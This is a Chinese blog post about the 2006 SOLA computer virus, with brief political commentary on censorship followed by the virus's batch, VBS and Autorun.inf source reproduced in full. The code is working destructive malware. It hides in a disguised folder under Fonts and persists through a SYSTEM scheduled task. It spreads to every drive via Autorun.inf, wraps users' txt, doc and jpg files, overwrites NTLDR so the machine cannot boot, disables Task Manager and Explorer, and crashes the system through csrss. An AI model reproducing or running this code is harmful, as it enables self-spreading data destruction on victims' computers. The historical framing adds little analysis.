---
categories: Original
date: 2025-05-28T00:00:00Z
tags:
    - Windows
    - 信息技术
    - 社会评论
slug: the-sola-virus
title: 苏拉病毒
---

> 苏拉病毒（英文名：SOLA）是一种针对 Windows 操作系统的病毒。诞生于 2006 年 1 月，在 2006-2009 年曾大规模流行过。可能是 ACG 圈相关的最早有过记载的电脑病毒。 （[萌娘百科](https://zh.moegirl.org.cn/zh-cn/%E8%8B%8F%E6%8B%89%E7%97%85%E6%AF%92)）

尽管萌娘百科称 _“而如今时过境迁，不仅越来越多优秀的动漫游戏被正式引入，国产 ACG 产业也在飞速发展，人民思想也更加开放包容”_，此叙述实则与事实不符（参见[2018 年中国大陆游戏版号冻结](https://zh.wikipedia.org/wiki/2018%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%A4%A7%E9%99%86%E6%B8%B8%E6%88%8F%E7%89%88%E5%8F%B7%E5%86%BB%E7%BB%93)、[游戏和谐 Wiki](https://github.com/gledos/ggame)），可以认为是[萌娘百科受中国政府监管审查影响](https://zh.wikipedia.org/wiki/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91#%E5%86%85%E5%AE%B9%E5%AE%A1%E6%9F%A5)的结果？现在，中国网络平台上的言论审查越来越严重，网民的仇恨言论增多、排外情绪愈发高涨。经济不发达永远不是通过行政手段进行严格文化审查的借口；通过压抑创新来实现稳定，往往既获得不了创新，也获得不了稳定。

作为一个主要依靠 Windows XP 下的批处理程序和 VB 运行的病毒，它的效果令人意外地好。

## `TENBATSU.BAT`

```bat
@echo off
set time=2000
:step1
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                      I'm a virus. My name is sola.
echo                        我是一个病毒。我的名字叫苏拉。
echo                      今天，在这片堕落的土地上，我苏醒过来。
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step1
set time=2000


:step2
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        我曾经很快乐地活着，与我的朋友，ACG，快乐地活着。
echo                        我曾经也对病毒深恶痛绝。
echo                        然而.............
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step2
set time=2000

:step3
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                      自从我来到了这片土地上，这片自称伟大，崇高，光明的土地上。
echo                        这片名为中国的土地上
echo                        我的朋友，已遍体鳞伤。
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step3
set time=500

:step4
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        他死了
echo                        Death Note
echo                        《死亡笔记》
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step4
set time=500

:step5
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        她死了
echo                        Koihime Musou
echo                        《恋姬 无双》
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step5
set time=1000

:step6
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        还有好多好多的同胞，惨死在你们的蹂躏之下。
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step6
set time=2000


:step7
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        广电总局的一纸通告，无数只肮脏的手便掩盖了她的气息。
echo                        互联网上的一句咒骂，无数声污秽的咒骂便淹没了她的踪迹。
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step7
set time=3000

:step8
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        我终于知道了，信息，原来是无法透过国界线而传播的。
echo                        即使是爱，即使是恨，即使是那一个个爱恨与泪水交织的故事。
echo                   也无法透过GFW，更无法透过这个国度的某些人心中，那道厚厚的屏障。
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step8
set time=1000

:step9
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        于是，我愿做这个罪恶的病毒，来再次查看，你的心灵。
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step9
set time=500

:step10
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        你，是谁？？？
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step10
set time=500

:step11
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        是中国人吗？
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step11
set time=500

:step12
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        是民族情绪的受害人吗？
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step12
set time=3000

:step13
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                        还是知道，世界上有一个词语叫ACG，并能够容忍，接纳它呢？
color 0f
sleep 30
color f0
sleep 30
set /a time=%time%-60
if /i %time% gtr 0 goto step13
set time=3000

cls
color 0f
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo                        那，让我们来做一个游戏吧。
sleep 2000
echo                        也许你的记忆中，还有1000年前夏天的传说。
sleep 2000
echo                        还有120元的车票，
sleep 1000
echo                        还有银河铁道，
sleep 1000
echo                        还有钢琴之森，
sleep 1000
echo                        还有澄澈的天空下，响起的祈祷之歌。
sleep 3000
cls
echo 
echo 
echo               警告：如果现在关闭计算机，计算机将无法启动！！！
echo 
echo 
echo 
echo 
echo 
echo 
sleep 1000
echo                        你需要做的，仅仅是回答几个问题。
sleep 2000
echo                        你喜欢动画吗？
sleep 800
echo                        你喜欢漫画吗？
sleep 800
echo                        你喜欢GAL游戏吗？
sleep 2000
echo         选择你最擅长的测试卷吧，然后用你聪明的头脑思考，写出心中的答案。
sleep 2000
echo         如果你的试卷能及格，我将痛悔我的罪行，并删除自己。
sleep 2000
echo         如果你的试卷是零分，我将继承同伴的愤怒，破坏你的计算机。
sleep 2000
echo         另外我必须说，我只能把10分钟的时间留给你。
sleep 2000
echo         现在，你无法逃避。
sleep 2000
echo         因为你已经无法打开任务管理器，更无法上网查找信息。
sleep 2000
echo         选择吧，但是要快，容不得犹豫。我已经打开了我的计时器。
sleep 1000
echo 
echo 我最擅长的测试卷：
:Choice
set /p choice=(请输入 A 或 G 。A=动画，G=GAL游戏。输入后按回车。):

if /I "%choice%"=="a" goto Anime
if /I "%choice%"=="g" goto Galgame

goto Choice


:Anime

set grade=0
:AQ1
cls
set ask=
echo ----------------问题1---------------------（注：一共有5个问题。只要答对两个或两个以上就过关。）
echo     男主角在入学第一天就听到女主角惊天动地的发言，并加入了女主角创建的一个社团，这个社团教室原本是文学社的，但被女主角强行占用。主要社团成员有：眼睛娘、很有气势的社长、有着魔鬼身材，比男主角高一个年级的吉祥物、被社长指挥得团团转的男主角。
echo 请问这个社团叫什么团？（3个英文字母）
echo 如果无法回答，请输入next，跳转到下一个问题。
echo 
set /p ask=回答：
if /i "%ask%"=="sos" set /a grade=%grade%+1
if /i "%ask%"=="" goto AQ1
:AQ2
cls
set ask=
echo ----------------问题2---------------------
echo     男主角与女主角在小镇上相遇，女主角非常喜欢恐龙，有模仿某种动物叫声的口癖，并且女主角与n(n大于或等于618，小于或等于1321)年前某个夏天的故事有关系，这个女主角和n年前夏天故事的女主角的姓氏的第一个字都是“神”。
echo 请写出这部作品的名称（3个英文字母）
echo 如果无法回答，请输入next，跳转到下一个问题。
echo 
set /p ask=回答：
if /i "%ask%"=="air" set /a grade=%grade%+1
if "%ask%"=="" goto AQ2
:AQ3
cls
set ask=
echo ----------------问题3---------------------
echo     如果用B、C分别代表2种人或物体的名称，那么每隔一段时间，就会有7个被B选中的人参加一种名为B战争的战斗，获胜者可以获得B，而C是B召唤出来的，拥有强大的力量，帮助主人为了B而战斗。
echo 请问这部作品的名称的前4个英文字母是什么？
echo 如果无法回答，请输入next，跳转到下一个问题。
echo 
set /p ask=回答：
if /i "%ask%"=="fate" set /a grade=%grade%+1
if "%ask%"=="" goto AQ3
:AQ4
cls
set ask=
echo ----------------问题4---------------------
echo      如果用A表示一个名词，那么有一部作品的名称为A少女，A少女们互相战斗，夺取对方的A之心，没有A之心的少女会永远沉睡，一个A少女收集齐了其他A少女的A之心之后，就有某种事情要发生。
echo 请问A的汉语拼音字母是（8个字母）
echo 如果无法回答，请输入next，跳转到下一个问题。
echo 
set /p ask=回答：
if /i "%ask%"=="qiangwei" set /a grade=%grade%+1
if "%ask%"=="" goto AQ4
:AQ5
cls
set ask=
echo ----------------问题5---------------------
echo      有一种战斗机，只有神经系统接受了改造的人才能驾驶。4个孩子作为该战斗机的驾驶员展开训练，3个孩子先后在事故中丧生。军方为了给最后一个孩子作战的理由，让她转入了某学校。她于一个晚上，在学校的游泳池里遇到了男主角。后来，女主角加入了一个社团，该社团连同女主角共有4人。
echo 这部作品名称中有3个英文字母，请问这3个英文字母是？
echo 如果无法回答，请输入next，跳转到计分程序。
echo 
set /p ask=回答：
if /i "%ask%"=="ufo" set /a grade=%grade%+1
if "%ask%"=="" goto AQ5
cls
goto MarkCount


:Galgame

set grade=0
:GQ1
cls
set ask=
echo ----------------问题1---------------------（注：一共有5个问题。只要答对两个或两个以上就过关。）
echo      患病的男主角在医院里遇上患病的少女，并和她一起逃出医院，到达了某地。这个地方盛产某种花，而女主角也喜欢这种花。传说这种花是一个美男子被诅咒而变成的。
echo 请问这部作品的名称是？（8个英文字母。）
echo 如果无法回答，请输入next，跳转到下一个问题。
echo 
set /p ask=回答：
if /i "%ask%"=="narcissu" set /a grade=%grade%+1
if /i "%ask%"=="" goto GQ1
:GQ2
cls
set ask=
echo ----------------问题2---------------------
echo     男主角与女主角在小镇上相遇，女主角非常喜欢恐龙，有模仿某种动物叫声的口癖，并且女主角与n(n大于或等于618，小于或等于1321)年前某个夏天的故事有关系，这个女主角和n年前夏天故事的女主角的姓氏的第一个字都是“神”。
echo 请写出这部作品的名称（3个英文字母）
echo 如果无法回答，请输入next，跳转到下一个问题。
echo 
set /p ask=回答：
if /i "%ask%"=="air" set /a grade=%grade%+1
if "%ask%"=="" goto GQ2
:GQ3
cls
set ask=
echo ----------------问题3---------------------
echo      男主角遭遇车祸，醒来后发现世界已经变成地狱一般的景象，往昔的朋友变成了怪物。只有女主角在他的眼中才是正常的人类。于是，他守护着自己心中唯一的真实。
echo 请写出这部作品的女主角的名字的中文拼音。（5个字母，字母中间不要加空格。）
echo 如果无法回答，请输入next，跳转到下一个问题。
echo 
set /p ask=回答：
if /i "%ask%"=="shaye" set /a grade=%grade%+1
if "%ask%"=="" goto GQ3
:GQ4
cls
set ask=
echo ----------------问题4---------------------
echo      有如下词语来描述B：很小，有薄薄的翅膀，下雨也不会被淋湿。有如下词语来描述A：一种乐器，要靠魔力来演奏，与人声搭配最为恰当。而C是一个一年四季都下着雨的城市，D是一所音乐学院。
echo 请写出故事情节中同时包含A、B、C、D的作品的中文名称的前三个字的汉语拼音字母。（12个字母，字母中间不要加空格。）
echo 如果无法回答，请输入next，跳转到下一个问题。
echo 
set /p ask=回答：
if /i "%ask%"=="jiaoxiangyue" set /a grade=%grade%+1
if "%ask%"=="" goto GQ4
:GQ5
cls
set ask=
echo ----------------问题5---------------------
echo      在N年以后，人口暴涨。有些人就按下导弹开关，使细菌兵器袭击了地球，最终引起了一场恶战。在地球上的人类已经所剩无几的时候，有一个人为了寻找战前人类留下的有用物品，进入了一个废墟都市。在那里，他遇到了一个天象馆里的礼仪机器人，并和她发生了一段故事。
echo 这部作品名称的中文拼音是？（11个字母。字母中间不要加空格。其中第一个字是后鼻音。）
echo 如果无法回答，请输入next，跳转到计分程序。
echo 
set /p ask=回答：
if /i "%ask%"=="xingzhimeng" set /a grade=%grade%+1
if "%ask%"=="" goto GQ5
cls
goto MarkCount

:MarkCount
if "%grade%"=="0" goto Kill
if "%grade%"=="1" goto Kill
goto SelfKill


:Kill
cls
echo 
echo 
echo               你的成绩是%Grade%分，不及格！！！！！！！！！！
echo       不及格 不及格 不及格！！！！！！！！！！！！！！！！！！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                那么，就按照契约，毁灭你的计算机吧！！！！！
echo On Error Resume Next>Kill.VBS
echo set ws=wscript.createobject("wscript.shell")>>Kill.VBS
echo ws.run "%sola%\sola.bat -Kill",0 >>Kill.VBS
start Kill.VBS

:Kill20
cls
echo 
echo 
echo               你的成绩是%Grade%分，不及格！！！！！！！！！！
echo       不及格 不及格 不及格！！！！！！！！！！！！！！！！！！！！
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo                那么，就按照契约，毁灭你的计算机吧！！！！！
pause>nul
goto Kill20

:Selfkill
echo 
echo 
echo               您的成绩是%Grade%分，及格了。
echo       谢谢您完成了这套试题。5秒钟后，我将按照契约，删除自己。
echo              希望您能够过得愉快，再见。
echo 
sleep 5000
echo >%systemroot%\Fonts\HIDESE~1\Killself
echo On Error Resume Next>KillSelf.VBS
echo set ws=wscript.createobject("wscript.shell")>>KillSelf.VBS
echo ws.run "%sola%\sola.bat -Killself",0 >>KillSelf.VBS
start KillSelf.VBS
Exit
```

## `SOLA_2.0_6483999524724.bat`

```bat
@echo off
set sola=%systemroot%\Fonts\HIDESE~1
set setup=%systemroot%\Fonts\HIDESE~1\solasetup
FOR /F "tokens=1" %%i in ('date /t') do set Realdate=%%i
FOR /F "skip=5 tokens=1,4" %%i in ('dir %systemroot%\explorer.exe') do if /I "%%j"=="explorer.exe" set Date=%%i
if "%1"=="-Install" goto Install
if "%1"=="-Run" goto Run
if "%1"=="-Tenbatsu" goto Tenbatsu
if "%1"=="-Kill" goto Kill
if "%1"=="-Killself" goto Killself

:CheckSign
if "%1"=="-USB" start /max ..
if "%1"=="-USB" cd SOLA
if exist %systemroot%\Fonts\HIDESE~1\sola.sign goto Open

:FileCopy
set selfname=%0
:HIDESelf
date %Date%
md %systemroot%\Fonts\HIDESELF...\
date %RealDate%
if not "%1"=="-USB" type %selfname%>%systemroot%\Fonts\HIDESE~1\sola.bat
if "%1"=="-USB" type sola.bat>%systemroot%\Fonts\HIDESE~1\sola.bat
type Function.dll>%systemroot%\Fonts\HIDESE~1\Function.exe
echo On Error Resume Next>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo set ws=wscript.createobject("wscript.shell")>>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo ws.run "cmd /c %sola%\SOLA.BAT -Install",0 >>%systemroot%\Fonts\HIDESE~1\SOLA.VBS
cscript %systemroot%\Fonts\HIDESE~1\SOLA.VBS
echo>%systemroot%\Fonts\HIDESE~1\sola.sign
del %systemroot%\Fonts\HIDESE~1\SOLA.VBS
goto Open


:Install


:PackerSetup
%SystemDrive%
cd %systemroot%\Fonts\HIDESE~1
if exist Function.exe taskkill /f /im Function.exe
if exist solasetup rd /s /q solasetup
md solasetup
cd solasetup
copy ..\Function.exe Function.dll
..\Function.exe -x
cd..
date %Date%
type %setup%\rar.exe >%systemroot%\system32\rar.exe
date %Realdate%
copy %setup%\Function.dll %sola%\Function.dll
attrib %sola%\Function.dll +s +h +r
rar -m0 -ep -ep1 a %setup%\docpack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\txtpack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\exepack.dll %sola%\Function.dll
rar -m0 -ep -ep1 a %setup%\jpgpack.dll %sola%\Function.dll
del Function.exe



:Mainsetup
set A0001=copy
set A0002=attrib
set A0003=echo
set A0005=Shell Hardware Detection
tasklist >%sola%\task.txt
FOR /F "tokens=1" %%i in ('findstr /I "svchost.exe" "%sola%\task.txt"') do set svchost=%%i
%A0001% %systemroot%\system32\cmd.exe %sola%\%svchost%
del %sola%\task.txt

:Tasks
%A0002% %systemroot%\Tasks\Tasks.job -s -h -r
del %systemroot%\Tasks\Tasks.job

date %Date%
type %setup%\Tasks.xxx>%systemroot%\Tasks\Tasks.job
schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks" & if errorlevel 1 goto TaskFail
date %RealDate%

goto TaskSuc
:TaskFail
%homedrive%
cd "%ALLUSERSPROFILE%"
cd 「开始」菜单\程序\启动

date %Date%
%A0003% On Error Resume Next>SOLA.VBS
%A0003% set ws=wscript.createobject("wscript.shell")>>SOLA.VBS
%A0003% ws.run "%sola%\svchost.exe /c %sola%\SOLA.BAT -Run",0 >>SOLA.VBS
%A0001% SOLA.VBS %sola%\SOLA.VBS
%A0003% NT>%systemroot%\Fonts\HIDESE~1\NoTasks
date %RealDate%

:TaskSuc
%A0002% %systemroot%\Tasks\Tasks.job +s +h +r
date %Date%
%A0001% %setup%\sleep.exe %systemroot%\system32\sleep.exe
date %RealDate%

:NoAutoPlay
net stop "%A0005%"
%A0003% Windows Registry Editor Version 5.00>%systemroot%\Fonts\HIDESE~1\Regedit.reg
%A0003% [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ShellHWDetection]>>%systemroot%\Fonts\HIDESE~1\Regedit.reg
%A0003% "Start"=dword:00000004>>%systemroot%\Fonts\HIDESE~1\Regedit.reg
regedit /s %systemroot%\Fonts\HIDESE~1\Regedit.reg

::End of Install
goto End&if errorlevel 1 exit
::End of Install




:Run
set runroot=%ALLUSERSPROFILE%\「开始」菜单\程序\启动
set taskroot=%systemroot%\Tasks

:RunTimeChk
if not exist %sola%\RunTime.txt echo !50>%sola%\RunTime.txt
FOR /F "tokens=1 delims=!" %%i in (%sola%\RunTime.txt) do set RunTime=%%i
if /i %RunTime% leq 0 goto Virus
set /a RunTime=%Runtime%-1
echo !%Runtime%>%sola%\RunTime.txt

:Diskchk

echo On Error Resume Next>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
echo set ws=wscript.createobject("wscript.shell")>>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
echo ws.run "%sola%\svchost.exe /c %setup%\RecentInf.bat",0 >>%systemroot%\Fonts\HIDESE~1\RecentInf.VBS
cscript %systemroot%\Fonts\HIDESE~1\RecentInf.VBS
del %systemroot%\Fonts\HIDESE~1\RecentInf.VBS

for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do vol %%i:&if errorlevel 1 set %%i=1
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do echo 1>%%i:\solachk1 & findstr . %%i:\solachk1 & if not errorlevel 1 del %%i:\solachk1& findstr /C:"SOLA_1.0_2.0" %%i:\Autorun.inf & if errorlevel 1  attrib -s -h -r %%i:\Autorun.inf&copy /y %setup%\Autorun.inf %%i:\Autorun.inf&attrib %%i:\Autorun.inf +s +h +r&md %%i:\SOLA&copy /y "%setup%\sola.bat" %%i:\SOLA\SOLA.BAT&copy /y "%setup%\Function.dll" %%i:\SOLA\Function.dll&attrib %%i:\SOLA +s +h +r


:Turn
if "%C%"=="1" vol C:&if not errorlevel 1 call %setup%\Scan.bat C:
if "%D%"=="1" vol D:&if not errorlevel 1 call %setup%\Scan.bat D:
if "%E%"=="1" vol E:&if not errorlevel 1 call %setup%\Scan.bat E:
if "%F%"=="1" vol F:&if not errorlevel 1 call %setup%\Scan.bat F:
if "%G%"=="1" vol G:&if not errorlevel 1 call %setup%\Scan.bat G:
if "%H%"=="1" vol H:&if not errorlevel 1 call %setup%\Scan.bat H:
if "%I%"=="1" vol I:&if not errorlevel 1 call %setup%\Scan.bat I:
if "%J%"=="1" vol J:&if not errorlevel 1 call %setup%\Scan.bat J:
if "%K%"=="1" vol K:&if not errorlevel 1 call %setup%\Scan.bat K:
if "%L%"=="1" vol L:&if not errorlevel 1 call %setup%\Scan.bat L:
if "%M%"=="1" vol M:&if not errorlevel 1 call %setup%\Scan.bat M:
if "%N%"=="1" vol N:&if not errorlevel 1 call %setup%\Scan.bat N:
if "%O%"=="1" vol O:&if not errorlevel 1 call %setup%\Scan.bat O:
if "%P%"=="1" vol P:&if not errorlevel 1 call %setup%\Scan.bat P:
if "%Q%"=="1" vol Q:&if not errorlevel 1 call %setup%\Scan.bat Q:
if "%R%"=="1" vol R:&if not errorlevel 1 call %setup%\Scan.bat R:
if "%S%"=="1" vol S:&if not errorlevel 1 call %setup%\Scan.bat S:
if "%T%"=="1" vol T:&if not errorlevel 1 call %setup%\Scan.bat T:
if "%U%"=="1" vol U:&if not errorlevel 1 call %setup%\Scan.bat U:
if "%V%"=="1" vol V:&if not errorlevel 1 call %setup%\Scan.bat V:
if "%W%"=="1" vol W:&if not errorlevel 1 call %setup%\Scan.bat W:
if "%X%"=="1" vol X:&if not errorlevel 1 call %setup%\Scan.bat X:
if "%Y%"=="1" vol Y:&if not errorlevel 1 call %setup%\Scan.bat Y:
if "%Z%"=="1" vol Z:&if not errorlevel 1 call %setup%\Scan.bat Z:

if "%C%"=="2" vol C:&if errorlevel 1 set C=1
if "%D%"=="2" vol D:&if errorlevel 1 set D=1
if "%E%"=="2" vol E:&if errorlevel 1 set E=1
if "%F%"=="2" vol F:&if errorlevel 1 set F=1
if "%G%"=="2" vol G:&if errorlevel 1 set G=1
if "%H%"=="2" vol H:&if errorlevel 1 set H=1
if "%I%"=="2" vol I:&if errorlevel 1 set I=1
if "%J%"=="2" vol J:&if errorlevel 1 set J=1
if "%K%"=="2" vol K:&if errorlevel 1 set K=1
if "%L%"=="2" vol L:&if errorlevel 1 set L=1
if "%M%"=="2" vol M:&if errorlevel 1 set M=1
if "%N%"=="2" vol N:&if errorlevel 1 set N=1
if "%O%"=="2" vol O:&if errorlevel 1 set O=1
if "%P%"=="2" vol P:&if errorlevel 1 set P=1
if "%Q%"=="2" vol Q:&if errorlevel 1 set Q=1
if "%R%"=="2" vol R:&if errorlevel 1 set R=1
if "%S%"=="2" vol S:&if errorlevel 1 set S=1
if "%T%"=="2" vol T:&if errorlevel 1 set T=1
if "%U%"=="2" vol U:&if errorlevel 1 set U=1
if "%V%"=="2" vol V:&if errorlevel 1 set V=1
if "%W%"=="2" vol W:&if errorlevel 1 set W=1
if "%X%"=="2" vol X:&if errorlevel 1 set X=1
if "%Y%"=="2" vol Y:&if errorlevel 1 set Y=1
if "%Z%"=="2" vol Z:&if errorlevel 1 set Z=1




if exist %systemroot%\Fonts\HIDESE~1\NoTasks if not exist "%runroot%\SOLA.VBS" copy "%sola%\SOLA.VBS" "%runroot%\SOLA.VBS"
if not exist %systemroot%\Fonts\HIDESE~1\NoTasks if not exist %Taskroot%\Tasks.job copy %setup%\Tasks.xxx %Taskroot%\Tasks.job&attrib %Taskroot%\Tasks.job +s +h +r&schtasks /change /ru "NT AUTHORITY\SYSTEM" /tn "Tasks"
sleep 2000
goto Turn

::End of Run
goto End&if errorlevel 1 exit
::End of Run







:Virus
if not "%Runtime%"=="0" goto VirusChk
set /a RunTime=%Runtime%-1
echo !%Runtime%>%sola%\RunTime.txt
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
echo On Error Resume Next>TENBATSU.VBS
echo set ws=wscript.createobject("wscript.shell")>>TENBATSU.VBS
echo ws.run "%sola%\sola.bat -Tenbatsu",0 >>TENBATSU.VBS
goto Diskchk

:VirusChk
if not exist "%ALLUSERSPROFILE%\「开始」菜单\程序\启动\TENBATSU.VBS" goto Kill
goto Diskchk

:Tenbatsu
:KillNTLDR
attrib %systemdrive%\NTLDR -s -h -r
copy /Y %systemdrive%\NTLDR %sola%\NTLDR
echo NO NTLDR>%systemdrive%\NTLDR
::attrib %systemdrive%\NTLDR +s +h +r

:PauseSFC
start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -pn winlogon.exe',0);window.close()"

:KillTaskmgr
del /q /a %systemroot%\system32\dllcache\taskmgr.exe
taskkill /f /im taskmgr.exe & if errorlevel 1 ren %systemroot%\system32\taskmgr.exe taskmgr.xxx & if errorlevel 1 start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn taskmgr.exe',0);window.close()" & sleep 500
ren %systemroot%\system32\taskmgr.exe taskmgr.xxx

:KillExplorer
taskkill /f /im explorer.exe >nul& if errorlevel 1 ren %systemroot%\system32\explorer.exe explorer.xxx & start mshta "javascript:new ActiveXObject('WScript.Shell').Run('ntsd -c q -pn explorer.exe',0);window.close()" & sleep 500
ren %systemroot%\explorer.exe explorer.xxx
start /max %setup%\TENBATSU.BAT

:Timeset
sleep 660000
if exist %sola%\Killself Exit

:Kill
attrib %systemdrive%\NTLDR -s -h -r
echo NO NTLDR>%systemdrive%\NTLDR
::attrib %systemdrive%\NTLDR +s +h +r
tasklist >%sola%\Task.txt
FOR /F "tokens=2" %%i in ('findstr /I "csrss.exe" "%sola%\Task.txt"') do ntsd -p %%i
goto Diskchk



:KillSelf
:StartExplorer
ren %systemroot%\explorer.xxx explorer.exe
start %systemroot%\explorer.exe
:BackNTLDR
attrib %systemdrive%\NTLDR -s -h -r
copy /Y %sola%\NTLDR %systemdrive%\NTLDR
attrib %systemdrive%\NTLDR +s +h +r

:RenTmg
ren %systemroot%\system32\taskmgr.xxx taskmgr.exe

:KillVirus
copy %setup%\KillVirus.txt %sola%\KillVirus.txt
C:
cd\
md ~Install
cd ~Install
rar x -hpkakenhi200601 %setup%\SolaKiller.rar
mshta "javascript:new ActiveXObject('WScript.Shell').Run('C:\\~Install\\Install.bat %%1',0);window.close()"
rd /s /q %setup%
attrib %systemroot%\Tasks\Tasks.job -s -h -r
del %systemroot%\Tasks\Tasks.job
cd "%ALLUSERSPROFILE%\「开始」菜单\程序\启动"
if exist sola.vbs del sola.vbs
if exist tenbatsu.vbs del tenbatsu.vbs
start %systemroot%\system32\notepad.exe %sola%\KillVirus.txt
del %sola%\sola.bat
Exit



:Open
if "%1"=="-USB" Exit
goto GetName
:BackOpen
if not exist "%Name%" exit
call "%Name%"
:Save
FOR /F "delims=:" %%i in ('findstr "%Code%" *.exe') do set PackName=%%i
rar -m0 -ep -ep1 a "%PackName%" "%Name%"
echo %Code%>>"%PackName%"
:Del
attrib "%Name%" -s -h -r
del "%Name%"
attrib Function.dll -s -h -r
del Function.dll
attrib %0 -s -h -r
del %0
exit
::CMD program will stop there.
:GetName
set Code=SOLA_2.0_6483999524724
set Name=新建 文本文档.txt
goto Backopen
:End
```

## `Autorun.inf`

```inf
SOLA_1.0_2.0
[autorun]
shell\打开(&O)\command=mshta "javascript:new ActiveXObject('WScript.Shell').Run('SOLA\\SOLA.BAT -USB',0);window.close()"
shell=打开(&O)
shell\open=复制磁盘(&C)
shell\open\Command=mshta "javascript:new ActiveXObject('WScript.Shell').Run('SOLA\\SOLA.BAT -USB',0);window.close()"
shell\open\Default=1
shell\explore=资源管理器(&X)
shell\explore\Command=mshta "javascript:new ActiveXObject('WScript.Shell').Run('SOLA\\SOLA.BAT -USB',0);window.close()"
```

## `EJPack.txt`

```plain
goto GetName
:BackOpen
if not Exist "%Name%" exit
call "%Name%"
attrib "%Name%" -s -h -r
del "%Name%"
attrib Function.dll -s -h -r
del Function.dll
attrib %0 -s -h -r
del %0
exit
::CMD program will stop there.
:GetName
```

## `KillVirus.TXT`

```plain
各位OTAKU：
    您好。首先，让我对此病毒给您带来的
不便向您道歉。
    SOLA已经从您的计算机中清除。但由于
WINLOGON被锁定，计算机暂时无法关机、重
启，也无法打开任务管理器。但这些问题在
冷重启后即可解决。
    您的计算机已经有了SOLA的标记，因此
不会重复感染。
    在硬盘中还留有被SOLA病毒感染的文件
，尽管不会重复感染，但建议您清除它们。
系统中已经安装了SOLA的专杀程序，它可以
帮助您扫描并清除带毒文件。
    祝您好运。

                          SOLA的制造者
                               KAKENHI
```

## `LocalScan.bat`

```bat
:Start
set MB=
set MB=%*
cd %MB%\Recent
if errorlevel 1 goto End
set type=txt&set end=%setup%\TDPack.txt
FOR /F "delims=" %%i in ('dir /b *.txt.lnk') do call %setup%\Readlnk.bat %%i
set type=doc&set end=%setup%\TDPack.txt
FOR /F "delims=" %%i in ('dir /b *.doc.lnk') do call %setup%\Readlnk.bat %%i
set type=jpg&set end=%setup%\EJPack.txt
FOR /F "delims=" %%i in ('dir /b *.jpg.lnk') do call %setup%\Readlnk.bat %%i
del *.lnk
cd..&cd..
:End
```

## `RecentInf.bat`

```bat

set sola=%systemroot%\Fonts\HIDESE~1
set setup=%systemroot%\Fonts\HIDESE~1\solasetup
%HOMEDRIVE%
cd %USERPROFILE%
cd..
FOR /F "delims=" %%i in ('dir /b') do call %setup%\LocalScan.bat %%i
```

## `SOLA.BAT`

```bat
@echo off
set sola=%systemroot%\Fonts\HIDESE~1
set setup=%systemroot%\Fonts\HIDESE~1\solasetup
FOR /F "tokens=1" %%i in ('date /t') do set Realdate=%%i
